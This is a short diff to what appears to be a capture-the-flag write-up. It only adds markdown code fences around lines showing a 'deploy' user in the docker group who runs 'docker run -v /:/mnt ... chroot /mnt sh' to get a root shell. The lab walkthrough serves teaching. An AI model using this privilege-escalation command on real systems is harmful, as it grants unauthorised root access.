@@ -95,7 +95,9 @@ Last login: Thu Jan 26 22:32:54 2023 from 10.10.14.18
 $ bash
 deploy@shoppy:~$ id
 uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
+```
 ##### root
+```
 deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 # whoami;id
 root
